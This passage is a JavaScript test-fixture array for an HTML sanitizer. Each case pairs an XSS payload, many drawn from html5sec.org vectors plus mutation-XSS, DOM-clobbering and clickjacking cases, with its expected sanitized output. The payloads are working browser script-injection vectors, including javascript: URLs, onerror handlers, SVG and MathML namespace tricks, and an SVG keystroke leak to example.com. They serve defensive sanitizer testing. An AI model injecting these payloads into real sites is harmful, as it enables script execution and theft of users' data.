			'<div id="81"><x xmlns:xlink="http://www.w3.org/1999/xlink" xlink:actuate="onLoad" xlink:href="javascript:alert(81)" xlink:type="simple"/>//["\'`-->]]>]</div>',
		expected: '<div>//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="82"><?xml-stylesheet type="text/css" href="data:,*%7bx:expression(write(2));%7d"?>//["\'`-->]]>]</div><div id="83"><x:template xmlns:x="http://www.wapforum.org/2001/wml"  x:ontimer="$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:alert(83)"><x:timer value="1"/></x:template>//["\'`-->]]>]</div>',
		expected: '<div>//["\'`--&gt;]]&gt;]</div><div>//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="84"><x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="javascript:alert(84)//#x"/>//["\'`-->]]>]</div>',
		expected: '<div>//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="85"><x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="test.evt#x"/>//["\'`-->]]>]</div>',
		expected: '<div>//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="86"><body oninput=alert(86)><input autofocus>//["\'`-->]]>]</div><div id="87"><svg xmlns="http://www.w3.org/2000/svg">\n<a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(87)"><rect width="1000" height="1000" fill="white"/></a>\n</svg>//["\'`-->]]>]</div>',
		expected: '<div>//["\'`--&gt;]]&gt;]</div><div>\n<a></a>\n//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="89"><svg xmlns="http://www.w3.org/2000/svg">\n<set attributeName="onmouseover" to="alert(89)"/>\n<animate attributeName="onunload" to="alert(89)"/>\n</svg>//["\'`-->]]>]</div>',
		expected: '<div>\n\n\n//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="90"><!-- Up to Opera 10.63 -->\n<div style=content:url(test2.svg)></div>\n\n<!-- Up to Opera 11.64 - see link below -->\n\n<!-- Up to Opera 12.x -->\n<div style="background:url(test5.svg)">PRESS ENTER</div>//["\'`-->]]>]</div>',
		expected: '<div>\n<div></div>\n\n\n\n\n<div>PRESS ENTER</div>//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="91">[A]\n<? foo="><script>alert(91)</script>">\n<! foo="><script>alert(91)</script>">\n</ foo="><script>alert(91)</script>">\n[B]\n<? foo="><x foo=\'?><script>alert(91)</script>\'>">\n[C]\n<! foo="[[[x]]"><x foo="]foo><script>alert(91)</script>">\n[D]\n<% foo><x foo="%><script>alert(91)</script>">//["\'`-->]]>]</div>',
		expected:
			'<div>[A]\nalert(91)"&gt;\nalert(91)"&gt;\nalert(91)"&gt;\n[B]\n"&gt;\n[C]\n\n[D]\n&lt;% foo&gt;//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="92"><div style="background:url(http://foo.f/f oo/;color:red/*/foo.jpg);">X</div>//["\'`-->]]>]</div>',
		expected: '<div><div>X</div>//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="93"><div style="list-style:url(http://foo.f)\u0010url(javascript:alert(93));">X</div>//["\'`-->]]>]</div>',
		expected: '<div><div>X</div>//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="94"><svg xmlns="http://www.w3.org/2000/svg">\n<handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(94)</handler>\n</svg>//["\'`-->]]>]</div>',
		expected: '<div>\nalert(94)\n//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="95"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">\n<feImage>\n<set attributeName="xlink:href" to="data:image/svg+xml;charset=utf-8;base64,\nPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4NCg%3D%3D"/>\n</feImage>\n</svg>//["\'`-->]]>]</div>',
		expected: '<div>\n\n\n\n//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="96"><iframe src=mhtml:http://html5sec.org/test.html!xss.html></iframe>\n<iframe src=mhtml:http://html5sec.org/test.gif!xss.html></iframe>//["\'`-->]]>]</div>',
		expected: '<div>\n//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			"<div id=\"97\"><!-- IE 5-9 -->\n<div id=d><x xmlns=\"><iframe onload=alert(97)\"></div>\n<script>d.innerHTML+='';</script>\n<!-- IE 10 in IE5-9 Standards mode -->\n<div id=d><x xmlns='\"><iframe onload=alert(2)//'></div>\n<script>d.innerHTML+='';</script>//[\"'`-->]]>]</div>",
		expected:
			"<div>\n<div></div>\nd.innerHTML+='';\n\n<div></div>\nd.innerHTML+='';//[\"'`--&gt;]]&gt;]</div>",
	},
	{
		payload:
			'<div id="98"><div id=d><div style="font-family:\'sans\u0017\u0002F\u0002A\u0012\u0002A\u0002F\u0003B color\u0003Ared\u0003B\'">X</div></div>\n<script>with(document.getElementById("d"))innerHTML=innerHTML</script>//["\'`-->]]>]</div>',
		expected:
			'<div><div><div>X</div></div>\nwith(document.getElementById("d"))innerHTML=innerHTML//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="99">XXX<style>\n\n*{color:gre/**/en !/**/important} /* IE 6-9 Standards mode */\n\n<!--\n--><!--*{color:red}   /* all UA */\n\n*{background:url(xx //**/\red/*)} /* IE 6-7 Standards mode */\n\n</style>//["\'`-->]]>]</div>',
		expected:
			'<div>XXX\n\n*{color:gre/**/en !/**/important} /* IE 6-9 Standards mode */\n\n&lt;!--\n--&gt;&lt;!--*{color:red}   /* all UA */\n\n*{background:url(xx //**/\ned/*)} /* IE 6-7 Standards mode */\n\n//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload: '<div id="100"><img[a][b]src=x[d]onerror[c]=[e]"alert(100)">//["\'`-->]]>]</ndiv>',
		expected: '<div>//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload: '<div id="101"><a href="[a]java[b]script[c]:alert(101)">XXX</a>//["\'`-->]]>]</div>',
		expected: '<div><a>XXX</a>//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload: '<div id="102"><img src="x` `<script>alert(102)</script>"` `>//["\'`-->]]>]</div>',
		expected: '<div><img>//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="103"><script>history.pushState(0,0,\'/i/am/somewhere_else\');</script>//["\'`-->]]>]</div><div id="104"><svg xmlns="http://www.w3.org/2000/svg" id="foo">\n<x xmlns="http://www.w3.org/2001/xml-events" event="load" observer="foo" handler="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Chandler%20xml%3Aid%3D%22bar%22%20type%3D%22application%2Fecmascript%22%3E alert(104) %3C%2Fhandler%3E%0A%3C%2Fsvg%3E%0A#bar"/>\n</svg>//["\'`-->]]>]</div>',
		expected:
			"<div>history.pushState(0,0,'/i/am/somewhere_else');//[\"'`--&gt;]]&gt;]</div><div>\n\n//[\"'`--&gt;]]&gt;]</div>",
	},
	{
		payload:
			'<div id="105"><iframe src="data:image/svg-xml,%1F%8B%08%00%00%00%00%00%02%03%B3)N.%CA%2C(Q%A8%C8%CD%C9%2B%B6U%CA())%B0%D2%D7%2F%2F%2F%D7%2B7%D6%CB%2FJ%D77%B4%B4%B4%D4%AF%C8(%C9%CDQ%B2K%CCI-*%D10%D4%B4%D1%87%E8%B2%03"></iframe>//["\'`-->]]>]</div>',
		expected: '<div>//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload: '<div id="106"><img src onerror /" \'"= alt=alert(106)//">//["\'`-->]]>]</div>',
		expected: '<div><img>//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="107"><title onpropertychange=alert(107)></title><title title=></title>//["\'`-->]]>]</div>',
		expected: '<div>//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="108"><!-- IE 5-8 standards mode -->\n<a href=http://foo.bar/#x=`y></a><img alt="`><img src=xx onerror=alert(108)></a>">\n<!-- IE 5-9 standards mode -->\n<!a foo=x=`y><img alt="`><img src=xx onerror=alert(2)//">\n<?a foo=x=`y><img alt="`><img src=xx onerror=alert(3)//">//["\'`-->]]>]</div>',
		expected:
			'<div>\n<a></a><img alt="`><img src=xx onerror=alert(108)></a>">\n\n<img alt="`><img src=xx onerror=alert(2)//">\n<img alt="`><img src=xx onerror=alert(3)//">//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="109"><svg xmlns="http://www.w3.org/2000/svg">\n<a id="x"><rect fill="white" width="1000" height="1000"/></a>\n<rect  fill="white" style="clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);"/>\n</svg>//["\'`-->]]>]</div>',
		expected: '<div>\n<a></a>\n\n//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="110"><svg xmlns="http://www.w3.org/2000/svg">\n<path d="M0,0" style="marker-start:url(test4.svg#a)"/>\n</svg>//["\'`-->]]>]</div>',
		expected: '<div>\n\n//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="111"><div style="background:url(/f#[a]oo/;color:red/*/foo.jpg);">X</div>//["\'`-->]]>]</div>',
		expected: '<div><div>X</div>//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="112"><div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X</div>//["\'`-->]]>]</div><div id="113"><div id="x">XXX</div>\n<style>\n\n#x{font-family:foo[bar;color:green;}\n\n#y];color:red;{}\n\n</style>//["\'`-->]]>]</div>',
		expected:
			'<div><div>X</div>//["\'`--&gt;]]&gt;]</div><div><div>XXX</div>\n\n\n#x{font-family:foo[bar;color:green;}\n\n#y];color:red;{}\n\n//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="114"><x style="background:url(\'x[a];color:red;/*\')">XXX</x>//["\'`-->]]>]</div><div id="115"><!--[if]><script>alert(115)</script -->\n<!--[if<img src=x onerror=alert(2)//]> -->//["\'`-->]]>]</div>',
		expected: '<div>XXX//["\'`--&gt;]]&gt;]</div><div>\n//["\'`--&gt;]]&gt;]</div>',
	},
	{
		title: 'XML',
		payload:
			'<div id="116"><div id="x">x</div>\n<xml:namespace prefix="t">\n<import namespace="t" implementation="#default#time2">\n<t:set attributeName="innerHTML" targetElement="x" to="<img\u000Bsrc=x\u000Bonerror\u000B=alert(116)>">//["\'`-->]]>]</div>',
		expected: '<div><div>x</div>\n\n\n//["\'`--&gt;]]&gt;]</div>',
	},
	{
		title: 'iframe',
		payload:
			'<div id="117"><a href="http://attacker.org">\n    <iframe src="http://example.org/"></iframe>\n</a>//["\'`-->]]>]</div>',
		expected:
			'<div><a href="http://attacker.org?referrer=wordpress.com" target="_blank" rel="external noopener noreferrer">\n    \n</a>//["\'`--&gt;]]&gt;]</div>',
	},
	{
		title: 'Drag & drop',
		payload:
			'<div id="118"><div draggable="true" ondragstart="event.dataTransfer.setData(\'text/plain\',\'malicious code\');">\n    <h1>Drop me</h1>\n</div>\n<iframe src="http://www.example.org/dropHere.html"></iframe>//["\'`-->]]>]</div>',
		expected: '<div><div>\n    <h3>Drop me</h3>\n</div>\n//["\'`--&gt;]]&gt;]</div>',
	},
	{
		title: 'view-source',
		payload:
			'<div id="119"><iframe src="view-source:http://www.example.org/" frameborder="0" style="width:400px;height:180px"></iframe>',
		expected: '<div></div>',
	},
	{
		payload: '<textarea type="text" cols="50" rows="10"></textarea>//["\'`-->]]>]</div>',
		expected: '//["\'`--&gt;]]&gt;]',
	},
	{
		title: 'window.open',
		payload:
			'<div id="120"><script>\nfunction makePopups(){\n    for (i=1;i<6;i++) {\n        window.open(\'popup.html\',\'spam\'+i,\'width=50,height=50\');\n    }\n}\n</script>\n<body>\n<a href="#" onclick="makePopups()">Spam</a>//["\'`-->]]>]</div>',
		expected:
			"<div>\nfunction makePopups(){\n    for (i=1;i&lt;6;i++) {\n        window.open('popup.html','spam'+i,'width=50,height=50');\n    }\n}\n\n\n<a>Spam</a>//[\"'`--&gt;]]&gt;]</div>",
	},
	{
		payload:
			'<div id="121"><html xmlns="http://www.w3.org/1999/xhtml"\nxmlns:svg="http://www.w3.org/2000/svg">\n<body style="background:gray">\n<iframe src="http://example.com/" style="width:800px; height:350px; border:none; mask: url(#maskForClickjacking);"/>\n<svg:svg>\n<svg:mask id="maskForClickjacking" maskUnits="objectBoundingBox" maskContentUnits="objectBoundingBox">\n    <svg:rect x="0.0" y="0.0" width="0.373" height="0.3" fill="white"/>\n    <svg:circle cx="0.45" cy="0.7" r="0.075" fill="white"/>\n</svg:mask>\n</svg:svg>\n</body>\n</html>//["\'`-->]]>]</div>',
		expected:
			'<div>\n\n\n&lt;svg:svg&gt;\n&lt;svg:mask id="maskForClickjacking" maskUnits="objectBoundingBox" maskContentUnits="objectBoundingBox"&gt;\n    &lt;svg:rect x="0.0" y="0.0" width="0.373" height="0.3" fill="white"/&gt;\n    &lt;svg:circle cx="0.45" cy="0.7" r="0.075" fill="white"/&gt;\n&lt;/svg:mask&gt;\n&lt;/svg:svg&gt;\n&lt;/body&gt;\n&lt;/html&gt;//["\'`--&gt;]]&gt;]&lt;/div&gt;</div>',
	},
	{
		title: 'iframe (sandboxed)',
		payload:
			'<div id="122"><iframe sandbox="allow-same-origin allow-forms allow-scripts" src="http://example.org/"></iframe>//["\'`-->]]>]</div>',
		expected: '<div>//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="123"><span class=foo>Some text</span>\n<a class=bar href="http://www.example.org">www.example.org</a>\n<script src="http:/n/code.jquery.com/jquery-1.4.4.js"></script>\n<script>\n$("span.foo").click(function() {\nalert(\'foo\');\n$("a.bar").click();\n});\n$("a.bar").click(function() {\nalert(\'bar\');\nlocation="http://html5sec.org";\n});\n</script>//["\'`-->]]>]</div>',
		expected:
			'<div><span>Some text</span>\n<a href="http://www.example.org?referrer=wordpress.com" target="_blank" rel="external noopener noreferrer">www.example.org</a>\n\n\n$("span.foo").click(function() {\nalert(\'foo\');\n$("a.bar").click();\n});\n$("a.bar").click(function() {\nalert(\'bar\');\nlocation="http://html5sec.org";\n});\n//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="124"><script src="/example.com\foo.js"></script> // Safari 5.0, Chrome 9, 10\n<script src="\\example.com\foo.js"></script> // Safari 5.0//["\'`-->]]>]</div>',
		expected: '<div> // Safari 5.0, Chrome 9, 10\n // Safari 5.0//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="125"><?xml version="1.0"?><?xml-stylesheet type="text/xml" href="#stylesheet"?><!DOCTYPE doc [<!ATTLIST xsl:stylesheet  id    ID    #REQUIRED>]><svg xmlns="http://www.w3.org/2000/svg">    <xsl:stylesheet id="stylesheet" version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">        <xsl:template match="/">            <iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert(125)"></iframe>        </xsl:template>    </xsl:stylesheet>    <circle fill="red" r="40"></circle></svg>//["\'`-->]]>]</div>',
		expected: '<div>]&gt;                                        //["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="126"><object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object>\n<object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="alert(126)" style="behavior:url(#x);"><param name=postdomevents /></object>//["\'`-->]]>]</div>',
		expected: '<div>\n//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="127"><svg xmlns="http://www.w3.org/2000/svg" id="x">\n<listener event="load" handler="#y" xmlns="http://www.w3.org/2001/xml-events" observer="x"/>\n<handler id="y">alert(127)</handler>\n</svg>//["\'`-->]]>]</div>',
		expected: '<div>\n\nalert(127)\n//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload: '<div id="128"><svg><style><img/src=x onerror=alert(128)// </b>//["\'`-->]]>]</div>',
		expected: '<div><img>//["\'`--&gt;]]&gt;]</div>',
	},
	{
		title: 'Inline SVG (data-uri)',
		payload:
			'<div id="129"><svg><image style=\'filter:url("data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22><script>parent.alert(129)</script></svg>")\'>\n<!--\nSame effect with\n<image filter=\'...\'>\n-->\n</svg>//["\'`-->]]>]</div>',
		expected: '<div>\n\n//["\'`--&gt;]]&gt;]</div>',
	},
	{
		title: 'MathML',
		payload:
			'<div id="130"><math href="javascript:alert(130)">CLICKME</math>\n<math>\n<!-- up to FF 13 -->\n<maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(2)">CLICKME</maction>\n\n<!-- FF 14+ -->\n<maction actiontype="statusline" xlink:href="javascript:alert(3)">CLICKME<mtext>http://http://google.com</mtext></maction>\n</math>//["\'`-->]]>]</div>',
		expected:
			'<div>CLICKME\n\n\nCLICKME\n\n\nCLICKMEhttp://http://google.com\n//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="132"><!doctype html>\n<form>\n<label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>\n<br>\n<input name="secret" type="password">\n</form>\n<!-- injection --><svg height="50px">\n<image xmlns:xlink="http://www.w3.org/1999/xlink">\n<set attributeName="xlink:href" begin="accessKey(a)" to="//example.com/?a" />\n<set attributeName="xlink:href" begin="accessKey(b)" to="//example.com/?b" />\n<set attributeName="xlink:href" begin="accessKey(c)" to="//example.com/?c" />\n<set attributeName="xlink:href" begin="accessKey(d)" to="//example.com/?d" />\n</image>\n</svg>//["\'`-->]]>]</div>',
		expected:
			'<div>\n\ntype a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)\n\n\n\n\n\n\n\n\n\n\n//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload: '<div id="133"><!-- `<img/src=xxx onerror=alert(133)//--!>//["\'`-->]]>]</div>',
		expected: '<div>//["\'`--&gt;]]&gt;]</div>',
	},
	{
		title: 'XMP',
		payload:
			"<div id=\"134\"><xmp>\n<%\n</xmp>\n<img alt='%></xmp><img src=xx onerror=alert(134)//'>\n\n<script>\nx='<%'\n</script> %>/\nalert(2)\n</script>\n\nXXX\n<style>\n*['<!--']{}\n</style>\n-->{}\n*{color:red}</style>//[\"'`-->]]>]</div>",
		expected:
			"<div>\n&lt;%\n\n<img alt=\"%></xmp><img src=xx onerror=alert(134)//\">\n\n\nx='&lt;%'\n %&gt;/\nalert(2)\n\n\nXXX\n\n*['&lt;!--']{}\n\n--&gt;{}\n*{color:red}//[\"'`--&gt;]]&gt;]</div>",
	},
	{
		title: 'SVG',
		payload:
			'<div id="135"><?xml-stylesheet type="text/xsl" href="#" ?>\n<stylesheet xmlns="http://www.w3.org/TR/WD-xsl">\n<template match="/">\n<eval>new ActiveXObject(\'htmlfile\').parentWindow.alert(135)</eval>\n<if expr="new ActiveXObject(\'htmlfile\').parentWindow.alert(2)"></if>\n</template>\n</stylesheet>//["\'`-->]]>]</div>',
		expected: '<div>\n\n\n//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="136"><form action="x" method="post">\n<input name="username" value="admin" />\n<input name="password" type="password" value="secret" />\n<input name="injected" value="injected" dirname="password" />\n<input type="submit">\n</form>//["\'`-->]]>]</div>',
		expected: '<div>\n\n\n\n\n//["\'`--&gt;]]&gt;]</div>',
	},
	{
		title: 'SVG',
		payload:
			'<div id="137"><svg>\n<a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="?">\n<circle r="400"></circle>\n<animate attributeName="xlink:href" begin="0" from="javascript:alert(137)" to="&" />\n</a>//["\'`-->]]>]</div>',
		expected: '<div>\n<a>\n\n\n</a>//["\'`--&gt;]]&gt;]</div>',
	},
	{
		title: 'DOM clobbering: submit',
		payload: '<input name=submit>123',
		expected: '123',
	},
	{
		title: 'DOM clobbering: acceptCharset',
		payload: '<input name=acceptCharset>123',
		expected: '123',
	},
	{
		title: 'DOM clobbering: hasChildNodes',
		payload: '<form><input name=hasChildNodes>',
		expected: '',
	},
	{
		title: 'Testing support for sizes and srcset',
		payload: '<img src="small.jpg" srcset="medium.jpg 1000w, large.jpg 2000w">',
		expected: '<img>',
	},
	{
		title: "See #264 and Edge's weird attribute name errors",
		payload: '<div &nbsp;=""></div>',
		expected: '<div></div>',
	},
	{
		title: 'Tests against mXSS behavior in older MS Edge',
		payload: '<x/><title>&amp;lt;/title&amp;gt;&amp;lt;img src=1 onerror=alert(1)&gt;',
		expected: '&amp;lt;/title&amp;gt;&amp;lt;img src=1 onerror=alert(1)&gt;',
	},
	{
		title: 'Tests against mXSS behavior with SVG in Chrome 77 and alike 1/2',
		payload:
			'<svg></p><textarea><title><style></textarea><img src=x onerror=alert(1)></style></title></svg>',
		expected: '<p></p>&lt;title&gt;&lt;style&gt;<img>',
	},
	{
		title: 'Tests against mXSS behavior with SVG in Chrome 77 and alike 2/2',
		payload: '<svg></p><title><a id="</title><img src=x onerror=alert()>"></textarea></svg>',
		expected: '<p></p>&lt;a id="<img>"&gt;',
	},
	{
		title: 'Tests against mXSS behavior with MathML in Chrome 77 and alike',
		payload: '<math></p><textarea><mi><style></textarea><img src=x onerror=alert(1)></mi></math>',
		expected: '<p></p>&lt;mi&gt;&lt;style&gt;<img>',
	},
	{
		title: 'Tests against mXSS behavior with SVG Templates in Chrome 77 and alike',
		payload: '<svg></p><title><template><style></title><img src=x onerror=alert(1)>',
		expected: '<p></p>&lt;template&gt;&lt;style&gt;<img>',
	},
	{
		title: 'Tests against mXSS behavior with MathML Templates in Chrome 77 and alike',
		payload: '<math></br><textarea><mtext><template><style></textarea><img src=x onerror=alert(1)>',
		expected: '&lt;mtext&gt;&lt;template&gt;&lt;style&gt;<img>',
	},
	{
		title: 'Fixed an exception coming from missing clobbering protection',
		payload: '<form><input name=namespaceURI>',
		expected: '',
	},
	{
		title: 'Tests against mXSS behavior with embedded MathML/SVG',
		payload: '<svg></p><math><title><style><img src=x onerror=alert(1)></style></title>',
		expected: '<p></p><img>',
	},
	{
		title: 'Tests against attribute-based mXSS behavior 1/3',
		payload: '<svg><p><style><g title="</style><img src=x onerror=alert(1)>">',
		expected: '<p>&lt;g title="<img>"&gt;</p>',
	},
	{
		title: 'Tests against attribute-based mXSS behavior 2/3',
		payload:
			'<svg><foreignobject><p><style><p title="</style><iframe onload&#x3d;alert(1)<!--"></style>',
		expected: '<p>&lt;p title="&lt;/style&gt;</p>',
	},
	{
		title: 'Tests against attribute-based mXSS behavior 3/3',
		payload:
			'<math><annotation-xml encoding="text/html"><p><style><p title="</style><iframe onload&#x3d;alert(1)<!--"></style>',
		expected: '<p>&lt;p title="&lt;/style&gt;</p>',
	},
	{
		title: 'Tests against removal-based mXSS behavior 1/2',
		payload: "<xmp><svg><b><style><b title='</style><img>'>",
		expected: "&lt;svg&gt;&lt;b&gt;&lt;style&gt;&lt;b title='&lt;/style&gt;&lt;img&gt;'&gt;",
	},
	{
		title: 'Tests against removal-based mXSS behavior 2/2',
		payload: "<noembed><svg><b><style><b title='</style><img>'>",
		expected: "&lt;svg&gt;&lt;b&gt;&lt;style&gt;&lt;b title='&lt;/style&gt;&lt;img&gt;'&gt;",
	},
	{
		title: 'Tests against nesting-based mXSS behavior 1/5',
		payload: '<form><math><mtext></form><form><mglyph><style><img src=x onerror=alert(1)>',
		expected: '&lt;img src=x onerror=alert(1)&gt;',
	},
	{
		title: 'Tests against nesting-based mXSS behavior 2/5',
		payload: '<math><mtext><table><mglyph><style><math href=javascript:alert(1)>CLICKME</math>',
		expected: '&lt;math href=javascript:alert(1)&gt;CLICKME&lt;/math&gt;',
	},
	{
		title: 'Tests against nesting-based mXSS behavior 3/5',
		payload:
			'<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">',
		expected: '&lt;!--<img>',
	},
	{
		title: 'Tests against nesting-based mXSS behavior 4/5',
		payload:
			'<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert(1) src>">',
		expected: '',
	},
	{
		title: 'Tests against nesting-based mXSS behavior 5/5',
		payload:
			'<math><mtext><table><mglyph><svg><mtext><style><path id="</style><img onerror=alert(1) src>">',
		expected: '',
	},
	{
		title: 'Tests against additonal problems regarding HTML inside MathML 1/2',
		payload:
			'<math><mtext><h1><a><h6></a></h6><mglyph><svg><mtext><style><a title="</style><img src onerror=\'alert(1)\'>"></style></h1>',
		expected: '<h3><a></a><h6><a></a></h6><a></a></h3>',
	},
	{
		title: 'Tests against additonal problems regarding HTML inside MathML 2/2',
		payload: '<!-- more soon -->',
		expected: '',
	},
	{
		title: 'Test against fake-element-based namepsace-confusion abusing mXSS attacks 1/2',
		payload:
			'a<svg><xss><desc><noscript>&lt;/noscript>&lt;/desc>&lt;s>&lt/s>&lt;style>&lt;a title="&lt;/style>&lt;img src onerror=alert(1)>">',
		expected:
			'a&lt;/noscript&gt;&lt;/desc&gt;&lt;s&gt;&lt;/s&gt;&lt;style&gt;&lt;a title="&lt;/style&gt;&lt;img src onerror=alert(1)&gt;"&gt;',
	},
	{
		title: 'Test against fake-element-based namepsace-confusion abusing mXSS attacks 2/2',
		payload:
			"<math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><style><a title=\"</style><img src='#' onerror='alert(1)'>\">",
		expected: '<a></a>',
	},
	{
		title: 'Tests against proper handling of leading whitespaces',
		payload: ' ',
		expected: '',
	},
	{
		title: 'Tests against proper handling of empty MathML containers',
		payload: '<div><math></math></div>',
		expected: '<div></div>',
	},
	{
		title: 'Tests against proper handling of is attributes (which cannot be removed)',
		payload: '<b is="foo">bar</b>',
		expected: '<b is="foo">bar</b>',
	},
	{
		title: 'Tests against removal of templates inside select elements',
		payload: '<select><template></template></select>',
		expected: '',
	},
];
